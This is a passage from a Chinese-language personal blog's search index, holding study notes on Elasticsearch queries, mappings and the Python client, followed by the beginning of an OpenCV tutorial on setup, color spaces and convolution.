class="line">GET goods&#x2F;fruit&#x2F;_search</span><br><span class="line">&#123;</span><br><span class="line">    &quot;query&quot;:&#123;</span><br><span class="line">        &quot;match_all&quot;:&#123;&#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;_source&quot;:</span><br><span class="line">    [</span><br><span class="line">        &quot;name&quot;,</span><br><span class="line">        &quot;age&quot;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="bool查询"><a class="markdownIt-Anchor" href="#bool查询"></a> bool查询</h3><ul><li>must：多个条件相互与</li><li>should：多个条件相互或</li><li>must_not：多个条件非</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET goods&#x2F;fruit&#x2F;_search</span><br><span class="line">&#123;</span><br><span class="line">    &quot;query&quot;:&#123;</span><br><span class="line">        &quot;bool&quot;:&#123;</span><br><span class="line">            &quot;must&quot;:[</span><br><span class="line">                &#123;</span><br><span class="line">                    &quot;match&quot;:&#123;</span><br><span class="line">                        &quot;name&quot;:&quot;pingguo&quot;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    &quot;match&quot;:&#123;</span><br><span class="line">                        &quot;producer&quot;:&quot;zhongguo&quot;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="条件过滤查询"><a class="markdownIt-Anchor" href="#条件过滤查询"></a> 条件过滤查询</h3><ul><li>filter属于bool查询内</li><li>gt/gte/lt/lte</li><li>对于should做过滤条件，那么返回的结果中，_score的值和是否匹配到should有关，0代表不匹配。一般建议使用must</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET goods&#x2F;fruit&#x2F;_search</span><br><span class="line">&#123;</span><br><span class="line">    &quot;query&quot;:&#123;</span><br><span class="line">        &quot;bool&quot;:&#123;</span><br><span class="line">            &quot;must&quot;:[</span><br><span class="line">                &#123;</span><br><span class="line">                    &quot;match&quot;:&#123;</span><br><span class="line">                        &quot;name&quot;:&quot;pingguo&quot;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            ],</span><br><span class="line">            filter:&#123;</span><br><span class="line">                &quot;range&quot;:&#123;</span><br><span class="line">                    &quot;price&quot;:&#123;</span><br><span class="line">                        &quot;gt&quot;:100</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="查询列表数据"><a class="markdownIt-Anchor" href="#查询列表数据"></a> 查询列表数据</h3><ul><li>多个词检索，使用空格分隔</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET goods&#x2F;fruit&#x2F;_search</span><br><span class="line">&#123;</span><br><span class="line">    &quot;query&quot;:&#123;</span><br><span class="line">        &quot;match&quot;:&#123;</span><br><span class="line">            &quot;tags&quot;:&quot;haochi lv&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="短语检索"><a class="markdownIt-Anchor" href="#短语检索"></a> 短语检索</h3><ul><li>相比于match的方式，在检索内容中的精度更高，必须是匹配的词语</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET goods&#x2F;fruit&#x2F;_search</span><br><span class="line">&#123;</span><br><span class="line">    &quot;query&quot;:&#123;</span><br><span class="line">        &quot;match_phrase&quot;:&#123;</span><br><span class="line">            &quot;name&quot;:&quot;pingguo&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="短语前缀"><a class="markdownIt-Anchor" href="#短语前缀"></a> 短语前缀</h3><ul><li>类似于mysql： where name like pingguo%</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET goods&#x2F;fruit&#x2F;_search</span><br><span class="line">&#123;</span><br><span class="line">    &quot;query&quot;:&#123;</span><br><span class="line">        &quot;match_phrase_prefix&quot;:&#123;</span><br><span class="line">            &quot;name&quot;:&quot;pingguo&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="高亮检索"><a class="markdownIt-Anchor" href="#高亮检索"></a> 高亮检索</h3><ul><li>前置标签和后置标签分开写</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET goods&#x2F;fruit&#x2F;_search</span><br><span class="line">&#123;</span><br><span class="line">    &quot;query&quot;:&#123;</span><br><span class="line">        &quot;match&quot;:&#123;</span><br><span class="line">            &quot;name&quot;:&quot;pingguo&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;highline&quot;:&#123;</span><br><span class="line">        &quot;pre_tags&quot;:&quot;&lt;b style&#x3D;&#39;color:red&#39;&gt;&quot;,</span><br><span class="line">        &quot;post_tags&quot;:&quot;&lt;&#x2F;b&gt;&quot;,</span><br><span class="line">        &quot;fields&quot;:&#123;</span><br><span class="line">            &quot;name&quot;:&#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="聚合函数"><a class="markdownIt-Anchor" href="#聚合函数"></a> 聚合函数</h3><ul><li>avg、mean、sum、min、max</li><li>可以设置size:0使结果不显示数据，仅显示聚合结果</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET goods&#x2F;fruit&#x2F;_search</span><br><span class="line">&#123;</span><br><span class="line">    &quot;from&quot;:0,</span><br><span class="line">    &quot;size&quot;:10,</span><br><span class="line">    &quot;aggs&quot;:&#123;</span><br><span class="line">        &quot;avg_xxx&quot;:&#123;  # 查询结果别名</span><br><span class="line">            &quot;avg&quot;:&#123;</span><br><span class="line">                &quot;field&quot;:&quot;price&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>带查询条件的聚合函数</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET goods&#x2F;fruit&#x2F;_search</span><br><span class="line">&#123;</span><br><span class="line">    &quot;from&quot;:0,</span><br><span class="line">    &quot;size&quot;:10,</span><br><span class="line">    &quot;query&quot;:&#123;</span><br><span class="line">        &quot;bool&quot;:&#123;</span><br><span class="line">            &quot;must&quot;:[</span><br><span class="line">                &#123;</span><br><span class="line">                    &quot;match&quot;:&#123;</span><br><span class="line">                        &quot;name&quot;:&quot;pingguo&quot;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            ],</span><br><span class="line">            filter:&#123;</span><br><span class="line">                &quot;range&quot;:&#123;</span><br><span class="line">                    &quot;price&quot;:&#123;</span><br><span class="line">                        &quot;gt&quot;:100</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &quot;aggs&quot;:&#123;</span><br><span class="line">        &quot;avg_xxx&quot;:&#123;  # 查询结果别名</span><br><span class="line">            &quot;avg&quot;:&#123;</span><br><span class="line">                &quot;field&quot;:&quot;price&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>分段聚合函数</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET goods&#x2F;fruit&#x2F;_search</span><br><span class="line">&#123;</span><br><span class="line">    &quot;from&quot;:0,</span><br><span class="line">    &quot;size&quot;:10,</span><br><span class="line">    &quot;aggs&quot;:&#123;</span><br><span class="line">        &quot;avg_xxx&quot;:&#123;  # 查询结果别名</span><br><span class="line">            &quot;range&quot;:&#123;</span><br><span class="line">                &quot;field&quot;:&quot;price&quot;,</span><br><span class="line">                &quot;ranges&quot;:[</span><br><span class="line">                    &#123;</span><br><span class="line">                        &quot;from&quot;:0,</span><br><span class="line">                        &quot;to&quot;:50</span><br><span class="line">                    &#125;</span><br><span class="line">                ]</span><br><span class="line">            &#125;,</span><br><span class="line">            aggs:&#123;</span><br><span class="line">                &quot;sum_price&quot;:&#123;</span><br><span class="line">                    &quot;sum&quot;:&#123;</span><br><span class="line">                        &quot;field&quot;:&quot;price&quot;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="mapping"><a class="markdownIt-Anchor" href="#mapping"></a> mapping</h1><ul><li>mapping的作用就是指定当前字段的类型和大小</li><li>mapping查询</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET goods&#x2F;fruit&#x2F;_mapping</span><br></pre></td></tr></table></figure><ul><li>mapping创建使用</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PUT my_index1</span><br><span class="line">&#123;</span><br><span class="line">    &quot;mappings&quot;:&#123;</span><br><span class="line">        &quot;xxx&quot;:&#123;   #别名</span><br><span class="line">            &quot;dynamic&quot;:false,</span><br><span class="line">            &quot;properties&quot;:&#123;</span><br><span class="line">                &quot;myname&quot;:&#123;</span><br><span class="line">                    &quot;type&quot;:&quot;text&quot;,</span><br><span class="line">                    &quot;copy_to&quot;:&quot;full_name&quot;,</span><br><span class="line">                    &quot;index&quot;:&quot;true&quot;  # 设置索引</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;age&quot;:&#123;</span><br><span class="line">                    &quot;type&quot;:&quot;long&quot;</span><br><span class="line">                    &quot;index&quot;:&quot;false&quot;  # 设置不创建索引，查询会报错</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;full_name&quot;:&#123;</span><br><span class="line">                    &quot;type&quot;:&quot;text&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"># 放入数据</span><br><span class="line">PUT my_index1&#x2F;xxx&#x2F;1</span><br><span class="line">&#123;</span><br><span class="line">    &quot;myname&quot;:&quot;rrr&quot;,</span><br><span class="line">    &quot;age&quot;:123,</span><br><span class="line">    &quot;gender&quot;:&quot;male&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>配置<code>&quot;dynamic&quot;:false</code>时，可插入非定义字段，不会建立索引，下面语句查询结果为空</li><li>配置<code>&quot;dynamic&quot;:true</code>时，可插入非定义字段，会动态建立索引</li><li>配置<code>&quot;dynamic&quot;:strict</code>时，不可插入非定义字段，会报错</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET goods&#x2F;fruit&#x2F;_search</span><br><span class="line">&#123;</span><br><span class="line">    &quot;query&quot;:&#123;</span><br><span class="line">        &quot;match&quot;:&#123;</span><br><span class="line">            &quot;gender&quot;:&quot;male&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>配置<code>&quot;copy_to&quot;:&quot;full_name&quot;</code>指定字段赋值给full_name字段，full_name会包含有自己的值和拷贝的值</p></li><li><p>设置是否添加索引<code>&quot;index&quot;:&quot;false&quot;</code></p></li></ul><h1 id="lk分词"><a class="markdownIt-Anchor" href="#lk分词"></a> lk分词</h1><ul><li>建立字段，添加分析器</li><li><code>ik_max_word</code>是按照词来分，不配置时使用默认分析器，会按照字来分</li><li><code>ik_max_word</code>匹配的更多</li><li>可以使用title作为细颗粒的检索，content用分词的检索，效率会高一些。</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PUT my_index1</span><br><span class="line">&#123;</span><br><span class="line">    &quot;mappings&quot;:&#123;</span><br><span class="line">        &quot;xxx&quot;:&#123;   #别名</span><br><span class="line">            &quot;dynamic&quot;:false,</span><br><span class="line">            &quot;properties&quot;:&#123;</span><br><span class="line">                &quot;myname&quot;:&#123;</span><br><span class="line">                    &quot;type&quot;:&quot;text&quot;,</span><br><span class="line">                    &quot;analyzer&quot;:&quot;ik_max_word&quot;   </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">PUT my_index2</span><br><span class="line">&#123;</span><br><span class="line">    &quot;mappings&quot;:&#123;</span><br><span class="line">        &quot;xxx&quot;:&#123;   #别名</span><br><span class="line">            &quot;dynamic&quot;:false,</span><br><span class="line">            &quot;_all&quot;:&#123;  # 为所有字段增加解析方式</span><br><span class="line">                &quot;analyzer&quot;:&quot;ik_smart&quot;   </span><br><span class="line">            &#125;</span><br><span class="line">            &quot;properties&quot;:&#123;</span><br><span class="line">                &quot;myname&quot;:&#123;</span><br><span class="line">                    &quot;type&quot;:&quot;text&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>查询</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PUT my_index1&#x2F;doc&#x2F;1</span><br><span class="line">&#123;</span><br><span class="line">    &quot;myname&quot;:&quot;非公开飞机&quot;</span><br><span class="line">&#125;</span><br><span class="line">GET my_index1&#x2F;_search</span><br><span class="line">&#123;</span><br><span class="line">    &quot;query&quot;:&#123;</span><br><span class="line">        &quot;match&quot;:&#123;</span><br><span class="line">            &quot;myname&quot;:&quot;飞机&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="python操作"><a class="markdownIt-Anchor" href="#python操作"></a> python操作</h1><ul><li><a href="https://elasticsearch-py.readthedocs.io/en/master">官方文档</a></li></ul><h2 id="安装"><a class="markdownIt-Anchor" href="#安装"></a> 安装</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install elasticsearch</span><br></pre></td></tr></table></figure><h2 id="链接"><a class="markdownIt-Anchor" href="#链接"></a> 链接</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from elasticsearch import Elasticsearch</span><br><span class="line"># 链接</span><br><span class="line">es &#x3D; Elasticsearch([&#39;127.0.0.1:9200])</span><br><span class="line"># 创建索引</span><br><span class="line">es.indices.create(index&#x3D;&quot;es_test_01&quot;,ignore&#x3D;400)</span><br></pre></td></tr></table></figure><h2 id="基本操作"><a class="markdownIt-Anchor" href="#基本操作"></a> 基本操作</h2><ul><li>删除索引</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">es.indices.delete(index&#x3D;&quot;es_test_01&quot;)</span><br></pre></td></tr></table></figure><ul><li>插入数据</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">es.index(index&#x3D;&quot;es_test_01&quot;,doc_type&#x3D;&quot;doc&quot;,id&#x3D;1,body&#x3D;&#123;&quot;name&quot;:&quot;dasf&quot;,&quot;age&quot;:123&#125;) # 没有配置id，则会默认配置随机id</span><br></pre></td></tr></table></figure><ul><li>查询</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">res &#x3D; es.get(index&#x3D;&quot;es_test_01&quot;,doc_type&#x3D;&quot;doc&quot;,id&#x3D;1)</span><br><span class="line">res &#x3D; es.search(index&#x3D;&quot;es_test_01&quot;,doc_type&#x3D;&quot;doc&quot;,body&#x3D;&#123;&quot;query&quot;:&#123;&quot;match_all&quot;:&#123;&#125;&#125;&#125;)</span><br></pre></td></tr></table></figure><ul><li>删除数据</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">es.delete(index&#x3D;&quot;es_test_01&quot;,doc_type&#x3D;&quot;doc&quot;,id&#x3D;1)</span><br><span class="line">es.delete(index&#x3D;&quot;es_test_01&quot;,doc_type&#x3D;&quot;doc&quot;,body&#x3D;&#123;&quot;query&quot;:&#123;&quot;match_all&quot;:&#123;&#125;&#125;&#125;)</span><br></pre></td></tr></table></figure><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>opencv</title>
      <link href="/2020/07/27/opencv/"/>
      <url>/2020/07/27/opencv/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>opencv的使用</p></blockquote><a id="more"></a><h1 id="简介"><a class="markdownIt-Anchor" href="#简介"></a> 简介</h1><h2 id="opencv历史"><a class="markdownIt-Anchor" href="#opencv历史"></a> opencv历史</h2><ul><li>opencv1.0，主要由c语言编写，性能好，学习成本较高；</li><li>opencv2.0，c++，python的支持；</li><li>opencv3.0，进一步提高可用性；</li><li>opencv4.0，机器学习库的增加；</li></ul><h2 id="c环境配置"><a class="markdownIt-Anchor" href="#c环境配置"></a> c++环境配置</h2><ul><li><p>添加include库文件目录；</p></li><li><p>添加lib动态链接库目录；</p></li><li><p>添加附加依赖性，lib中的*.lib文件，在调试时使用带_d的；</p></li><li><p>添加opencv的dll文件到系统路径；</p></li><li><p>测试是否成功</p></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;opencv/opecv.hpp&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> cv;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  Mat src = imread(<span class="string">&quot;./lena.jpg&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(src.empty())<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  namedWindow(<span class="string">&quot;input&quot;</span>,WINDOW_AUTOSIZE);</span><br><span class="line">  imshow(<span class="string">&quot;input&quot;</span>,src);</span><br><span class="line">  waitKey(<span class="number">0</span>);</span><br><span class="line">  destroyAllWindows();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="python安装"><a class="markdownIt-Anchor" href="#python安装"></a> python安装</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip install opencv-python</span><br><span class="line">pip install opencv-contrib-python</span><br><span class="line">pip install pytessract</span><br></pre></td></tr></table></figure><h2 id="关于lena"><a class="markdownIt-Anchor" href="#关于lena"></a> 关于lena</h2><ul><li><a href="https://blog.csdn.net/u014061630/article/details/84388147">这里有详细介绍</a></li></ul><h1 id="系统操作"><a class="markdownIt-Anchor" href="#系统操作"></a> 系统操作</h1><h2 id="文件操作"><a class="markdownIt-Anchor" href="#文件操作"></a> 文件操作</h2><table><thead><tr><th>函数</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td>imread(filename,mode)</td><td>打开图片，默认BGR彩色图像，支持灰度，以及任意格式<br>IMREAD_COLOR：默认模式，彩色BGR<br>IMREAD_GRAYSCALE：灰度图像<br>IMREAD_ANYCOLOR：任意色彩类型<br>IMEAD_UNCHANGED：可以接收带透明通道图像</td><td></td></tr><tr><td>imshow(winName,src)</td><td>显示图片，不支持透明通道</td><td></td></tr><tr><td>imsave(filename,src)</td><td>根据文件名格式保存图片，支持各种格式</td><td></td></tr></tbody></table><ul><li>对于带有透明通道的图片，在imshow是无法显示的，必须通过IMEAD_UNCHANGED参数打开文件，并保存，使用图片浏览器查看。</li></ul><h2 id="窗口操作"><a class="markdownIt-Anchor" href="#窗口操作"></a> 窗口操作</h2><table><thead><tr><th>函数</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td>namedWindow(winName,mode)</td><td>窗口设置<br>WINDOW_AUTOSIZE：根据内容自适应，不能改变窗口大小<br>WINDOW_FREERATIO：任意比例，可以改变大小<br>WINDOW_NORMAL：也可以更改</td><td></td></tr></tbody></table><h1 id="色彩空间"><a class="markdownIt-Anchor" href="#色彩空间"></a> 色彩空间</h1><h2 id="常见色彩空间"><a class="markdownIt-Anchor" href="#常见色彩空间"></a> 常见色彩空间</h2><table><thead><tr><th>色彩空间</th><th></th></tr></thead><tbody><tr><td>RGB</td><td>非设备依赖的色彩空间</td></tr><tr><td>HSV</td><td>直方图效果最好</td></tr><tr><td>Lab</td><td>两通道</td></tr><tr><td>YC<sub>b</sub>C<sub>r</sub></td><td></td></tr></tbody></table><h2 id="色彩空间的相互转换"><a class="markdownIt-Anchor" href="#色彩空间的相互转换"></a> 色彩空间的相互转换</h2><h3 id="bgr2hsv"><a class="markdownIt-Anchor" href="#bgr2hsv"></a> BGR2HSV</h3><ul><li><p>公式</p></li><li><p>使用HSV过滤绿色背景</p></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">cvtColor(src,hsv,COLOR_BGR2HSV);</span><br><span class="line">inRange(hsv,Scalar(<span class="number">35</span>,<span class="number">43</span>,<span class="number">46</span>),Scalar(<span class="number">77</span>,<span class="number">255</span>,<span class="number">255</span>),mask);</span><br><span class="line">bitwise_not(mask,mask);</span><br><span class="line">bitwise_and(frame,frame,dst,mask);</span><br><span class="line">imshow(<span class="string">&quot;mask&quot;</span>,mask);</span><br><span class="line">imshow(<span class="string">&quot;dst&quot;</span>,dst);</span><br></pre></td></tr></table></figure><h3 id="代码实现"><a class="markdownIt-Anchor" href="#代码实现"></a> 代码实现</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Mat hsv,lab;</span><br><span class="line">cvtColor(src,hsv,COLOR_BGR2HSV);</span><br><span class="line">cvtColor(src,lab,COLOR_BGR2Lab);</span><br></pre></td></tr></table></figure><h2 id="彩色图像的饱和度和亮度"><a class="markdownIt-Anchor" href="#彩色图像的饱和度和亮度"></a> 彩色图像的饱和度和亮度</h2><h1 id="卷积和傅里叶变换"><a class="markdownIt-Anchor" href="#卷积和傅里叶变换"></a> 卷积和傅里叶变换</h1><h2 id="卷积"><a class="markdownIt-Anchor" href="#卷积"></a> 卷积</h2><h3 id="数学描述"><a class="markdownIt-Anchor" href="#数学描述"></a> 数学描述</h3><ul><li>连续定义</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>f</mi><mo>∗</mo><mi>g</mi><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><msubsup><mo>∫</mo><mi mathvariant="normal">∞</mi><mrow><mo>−</mo><mi mathvariant="normal">∞</mi></mrow></msubsup><mi>f</mi><mo stretchy="false">(</mo><mi>τ</mi><mo stretchy="false">)</mo><mi>g</mi><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mi>τ</mi><mo stretchy="false">)</mo><mi>d</mi><mi>τ</mi></mrow><annotation encoding="application/x-tex">(f*g)(n)=\int_{\infty }^{-\infty} f(\tau)g(n-\tau)d\tau</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.4331810000000007em;vertical-align:-0.9119499999999999em;"></span><span class="mop"><span class="mop op-symbol large-op" style="margin-right:0.44445em;position:relative;top:-0.0011249999999999316em;">∫</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.5212310000000007em;"><span style="top:-1.7880500000000001em;margin-left:-0.44445em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∞</span></span></span></span><span style="top:-3.812900000000001em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">∞</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9119499999999999em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.1132em;">τ</span><span class="mclose">)</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.1132em;">τ</span><span class="mclose">)</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.1132em;">τ</span></span></span></span></span></p><ul><li>离散定义</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>f</mi><mo>∗</mo><mi>g</mi><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><munderover><mo>∑</mo><mrow><mi>τ</mi><mo>=</mo><mo>−</mo><mi mathvariant="normal">∞</mi></mrow><mi mathvariant="normal">∞</mi></munderover><mi>f</mi><mo stretchy="false">(</mo><mi>τ</mi><mo stretchy="false">)</mo><mi>g</mi><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mi>τ</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(f*g)(n)=\sum_{\tau=-\infty }^{\infty} f(\tau)g(n-\tau)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.959733em;vertical-align:-1.308336em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6513970000000002em;"><span style="top:-1.8999949999999999em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.1132em;">τ</span><span class="mrel mtight">=</span><span class="mord mtight">−</span><span class="mord mtight">∞</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∞</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.308336em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.1132em;">τ</span><span class="mclose">)</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.1132em;">τ</span><span class="mclose">)</span></span></span></span></span></p><h3 id="图像卷积的作用"><a class="markdownIt-Anchor" href="#图像卷积的作用"></a> 图像卷积的作用</h3><ol><li>模糊</li><li>梯度</li><li>边缘</li><li>锐化</li></ol><h3 id="二维离散卷积"><a class="markdownIt-Anchor" href="#二维离散卷积"></a> 二维离散卷积</h3><h2 id="二维离散的傅里叶变换"><a class="markdownIt-Anchor" href="#二维离散的傅里叶变换"></a> 二维离散的傅里叶变换</h2><h2 id="傅里叶幅度谱与相位谱"><a 